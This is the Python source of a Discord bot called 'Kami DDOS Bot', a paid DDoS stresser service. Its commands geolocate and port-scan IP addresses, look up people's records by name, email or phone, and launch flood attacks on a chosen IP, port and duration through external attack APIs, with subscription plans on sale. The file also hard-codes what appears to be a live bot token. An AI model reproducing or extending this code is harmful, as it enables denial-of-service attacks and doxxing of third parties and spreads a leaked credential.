"""
@title: Kami DDOS Bot
@repo: https://github.com/NefariousTheDev/Kami-Bot
@since: 1/16/23
@author: vZy/Nefarious
@author_github: https://github.com/NefariousTheDev
"""
import discord, pytz, time
# from datetime import datetime

from core.discord import *
from core.auth.users import *
from core.tools import *
from core.api_utils import *
from core.plan_utils import *

prefix = "x"
current_time = "GANG_GANG" # datetime.now(pytz.timezone('EST'))
class Config:
    token = ""
    help_list = {"List of help commands (This) [DONE]": f"{prefix}help",
    "Infomation of my discord and kami account [DONE]": f"{prefix}myinfo",
    "Register a kami account [DONE]": f"{prefix}register",
    "Geo Location [DONE]": f"{prefix}geo <ip_address>",
    "Port Scanner [DONE]": f"{prefix}pscan <ip_address>",
    "Domain Up or Down Status [LAST_TASK]": f"{prefix}urlup <url>",
    "Account DB Lookup [LAST_TASK]": f"{prefix}db <username|email|firstname|lastname|phone#>",
    "Stresser [NEEDED]": f"{prefix}bbos <ip_address> <port> <time> <method>",
    "List of stresser plans [NEEDED]": f"{prefix}prices",
    "About Kami [NEEDED]": f"{prefix}kami"}


class MyClient(discord.Client):
    async def on_ready(self):
        print(f"[ + ] {self.user} successfully loaded up.....")

    async def on_message(self, message):
        msg = message.content
        msg_args = (message.content).split(" ")

        if message.author == self.user: return
        if msg.startswith(prefix) == False: return

        usr = User()
        kami_account = usr.find(f"{message.author.id}")

        if msg == f"{prefix}help":

            msg = setEmbedInfo("Kami | Help", "List of help commands", Config.help_list)
            await DiscordUtilities.embed(message, msg, False)

        elif msg == f"{prefix}register":

            if kami_account.userid == f"{message.author.id}": return await DiscordUtilities.embed(message, setEmbedInfo("Kami | Register", f"You are already reigstered to kami <@{message.author.id}>!", {}), False)
            
            u = setInfo(f"{message.author.name}", f"{message.author.id}", 0, 0, 0, 0)
            User().add(u)
            return await DiscordUtilities.embed(message, setEmbedInfo("Kami | Register", f"You have succesfully register a kami account! <@{message.author.id}>", {}), False)

        elif msg == f"{prefix}myinfo":
            if f"{kami_account.userid}" == "": # No KAMI Account
                return await DiscordUtilities.embed(message, setEmbedInfo("Kami | My Info", "Information of your discord and Kami account!", {"Discord Tag:": f"{message.author}", "Username:": f"{message.author.name}", "UserID:": f"{message.author.id}", "Kami Account": "You are not registered with kami!"}),  False)
            
            return await DiscordUtilities.embed(message, setEmbedInfo("Kami | My Info", "Information of your discord and Kami account!", {"Discord Tag:": f"{message.author}", "Username:": f"{message.author.name}", "UserID:": f"{message.author.id}", "Max Concurrents:": kami_account.max_con, "Max Time:": kami_account.max_time, "Mod Level:": kami_account.mod_level}), False)
        
        elif msg.startswith(f"{prefix}geo"):
            if len(msg_args) != 2: 
                return await DiscordUtilities.embed(message, setEmbedInfo("Kami | GeoIP Error", f"[ X ] Error, Invalid arguments provided\r\nUsage: {prefix}geo <ip_address>", {}), False)

            g = GeoIP(msg_args[1])
            if g._errCheck: 
                return await DiscordUtilities.embed(message, setEmbedInfo("Kami | Geo Error", f"[ X ] Error, Unable to grab geo location on this IP Address ({msg_args[1]})!", {}), False)

            e = setEmbedInfo("Kami | GeoIP", "Location information on an ip address.", {"Status:": g._status, "Country:": g._country, "Country Code:": g._countryCode, "Region:": g._region, "Region Name:": g._regionName, "City:": g._city, "Zip Code:": g._zip, "Latitude/Longitude:": f"{g._lat}/{g._lon}", "Timezone": g._timezone, "ISP:": g._isp, "Org:": g._org, "AS:": g._as, "Querty:": g._query})
            await DiscordUtilities.embed(message, e, True)

        elif msg.startswith(f"{prefix}pscan"):
            if len(msg_args) != 2: 
                return await DiscordUtilities.embed(message, setEmbedInfo("Kami | GeoIP Error", f"[ X ] Error, Invalid arguments provided\r\nUsage: {prefix}geo <ip_address>", {}), False)
            
            ports = pScan(msg_args[1])
            await DiscordUtilities.embed(message, setEmbedInfo("Kami | Port Scanner", f"Display open ports to a network", ports), True)
        
        elif msg.startswith(f"{prefix}bbos"):
            if message.author.id != 1061877346153541732: return await DiscordUtilities.embed(message, setEmbedInfo("Kami | Bbos Error", "[ X ] Error, You do not have premium to use this commands!", {}), False)
            if len(msg_args) != 5:
                return await DiscordUtilities.embed(message, setEmbedInfo("Kami | Bbos Error", f"[ X ] Error, Invalid arguments provided\r\nUsage: {prefix}bbos <ip_address> <port> <time> <method>", {}), False)

            if kami_account.userid != f"{message.author.id}": # .userid
                return await DiscordUtilities.embed(message, setEmbedInfo("Kami | Bbos Error", "you do not have a kami account", {}), False)

            if validateIP(msg_args[1]) == False: 
                return await DiscordUtilities.embed(message, setEmbedInfo("Kami | bbos Error", f"[ X ] Error, Invalid IP provided\r\nUsage: {prefix}bbos <ip> <port> <time> <method>", {}), False)

            if int(msg_args[2]) < 1 | int(msg_args[2]) > 65535 | msg_args[2].isdigit() == False: 
                return await DiscordUtilities.embed(message, setEmbedInfo("Kami | Bbos Error", f"[ X ] Error, Invalid Port provided\r\nUsage: {prefix}bbos <ip> <port> <time> <method>", {}), False)

            if int(msg_args[3]) > kami_account.max_time | msg_args[3].isdigit() == False: 
                return await DiscordUtilities.embed(message, setEmbedInfo("Kami | Bbos Error", f"[ X ] Error, You've went over your maximum boot time. Use a lower boot time!", {}), False)

            a = API(msg_args[4])
            if not a.check_for_apis():
                return await DiscordUtilities.embed(message, setEmbedInfo("Kami | Bbos Error", f"[ X ] Error, We do not have an API with this method!", {}), False)
            
            api_count = a.count_apis_found()
            a.request_attack(msg_args[1], int(msg_args[2]), int(msg_args[3]), msg_args[4])

            return await DiscordUtilities.embed(message, setEmbedInfo("Kami | Attack Status", f"Attack {msg_args[1]}:{msg_args[2]} for {msg_args[3]} seconds with {msg_args[4]} sent to {api_count} APIs...", a.get_responses()), False)

        elif msg.startswith(f"{prefix}prices"):
            plans = Plans()
            for plan in plans.get_plans():
                new_dict = {}
                new_dict['Max Time'] = plan.maxtime
                new_dict['Raw Max Time'] = plan.raw_maxtime
                new_dict['Concurrents'] = plan.concurrents
                new_dict['Cooldown'] = plan.cooldown
                new_dict['Price'] = plan.price
                await DiscordUtilities.embed(message, setEmbedInfo(f"Kami | Prices", f"Plan: {plan.name}", new_dict), False)
                time.sleep(0.50)

        # print(f"\x1b[31m[{current_time.month}/{current_time.day}/{current_time.year} % {current_time.hour}:{current_time.minute}]\x1b[0m{message.author}: \x1b[33m{msg}\x1b[0m")
        print(f"\x1b[31m{message.author}: \x1b[33m{msg}\x1b[0m")


intents = discord.Intents.default()
intents.message_content = True
client = MyClient(intents=intents)
client.run('MTA2NTE2NzA3MDUyMzgyNjE5OA.G7bbo2.ArqMrIaI4QbICo5s91dl6RaAqTXrbkDZdngkhg')